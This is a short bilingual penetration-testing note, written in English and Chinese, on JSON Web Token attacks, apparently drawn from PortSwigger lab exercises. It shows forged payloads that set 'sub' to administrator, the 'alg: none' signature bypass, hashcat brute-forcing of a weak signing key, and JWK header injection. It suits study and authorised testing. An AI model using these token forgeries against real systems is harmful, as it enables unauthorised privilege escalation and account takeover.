JSON web tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems. They can theoretically contain any kind of data, but are most commonly used to send information ("claims") about users as part of authentication, session handling, and access control mechanisms.

Unlike with classic session tokens, all of the data that a server needs is stored client-side within the JWT itself. This makes JWTs a popular choice for highly distributed websites where users need to interact seamlessly with multiple back-end servers.

## 1. Principle

以 `eyJ` 开头的一段编码字符串通常是 JWT, 其中 Header 和 Payload 部分是 Base64 编码, 若校验不完善, 可能存在越权

```
Header.Payload.Signature
```

### 1.1. Location

所有存在 JWT 格式的请求

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

## 2. Test

### 2.1. Unverified Signature

若 JWT 未经过签名校验, 可解码后修改 Payload 中的 `sub` 造成越权

```
{
    "iss": "portswigger",
    "exp": 1776841669,
    "sub": "administrator"
}
```

### 2.2. Flawed Signature Verification

若修改 Payload 中的用户名无效, 可继续尝试将 Header 中的 `alg` 修改为 `none`

```
{
    "kid": "64698eef-4457-4f52-8ec4-0f8bf09185dd",
    "alg": "none"
}
```

再删除 Signature 即可造成越权

```
Header.Payload.
```

### 2.3. Weak Signing Key

可尝试使用字典爆破目标使用的密钥

```
┌──(root㉿kali)-[~]
└─# hashcat -a 0 -m 16500 <YOUR-JWT> scraped-JWT-secrets.txt
```

```
eyJraWQiOiI3MjEzNmIxYy1mYzc1LTRmNzEtOTVmNi00N2Q2MjY1NTdjNTQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3Njg0NzYxMCwic3ViIjoid2llbmVyIn0.hJf-JRUSVZ_2NNUJ4PKotDxgxdgkRZjKzsezoU1kPHk:secret1
```

之后使用 JWT Editor Keys 创建 New Symmetric Key 以生成 JWK 格式的新密钥, 再将其中 `k` 的值修改为 Base64 编码后的 `secret1` 

```
{
    "kty": "oct",
    "kid": "5e0a523e-dac7-4ef7-aaeb-a1ab8f96b879",
    "k": "c2VjcmV0MQ=="
}
```

修改 Payload 中的 `sub` 

```
{
    "iss": "portswigger",
    "exp": 1776847610,
    "sub": "administrator"
}
```

在 Sign 中选择生成的密钥并选中 Don't modify header 即可篡改签名造成越权

### 2.4. JWK Header Injection

使用 JWT Editor Keys 创建 New RSA Key 后修改 Payload 中的 `sub` 

```
{
    "iss": "portswigger",
    "exp": 1776907742,
    "sub": "administrator"
}
```

在 Attack 中选择 Embedded JWK 即可篡改公钥造成越权

---

**Refrences**

- [JWT attacks](https://portswigger.net/web-security/jwt)
- [CWE-347](https://hackerone.com/hacktivity/cwe_discovery?id=cwe-347)

